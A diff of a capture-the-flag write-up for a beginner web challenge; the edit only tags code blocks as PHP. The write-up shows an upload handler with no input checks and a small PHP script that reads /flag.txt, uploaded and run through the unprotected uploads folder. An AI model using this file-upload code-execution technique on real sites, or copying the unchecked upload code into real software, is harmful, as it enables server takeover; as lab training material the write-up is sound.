@@ -4,7 +4,7 @@ This challenge is part of the "Web" category and is level 1.
 
 ## Program structure (only upload.php)
 
-```
+```PHP
 <?php
   if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     if (isset($_FILES)) {
@@ -70,7 +70,7 @@ This challenge is part of the "Web" category and is level 1.
 
 Not doing any input sanitization leaving the risk for **RCE**.
 
-```
+```PHP
 $directory = './uploads/';
 $file = $_FILES["file"];
 $error = $file["error"];
@@ -82,7 +82,7 @@ $tmp_name = $file["tmp_name"];
 
 So what I did was write a basic **PHP script**, that reads and output the content of the file **flag.txt**:
 
-```
+```PHP
 <?php
 $file = fopen("/flag.txt", "r");
 if ($file) {
@@ -96,7 +96,7 @@ if ($file) {
 
 Later I just went to **/upload.php** and selected the my PHP script which I named **solve.php**. It told me to go to:
 
-```
+```PHP
 /uploads/solve.php
 ```
 
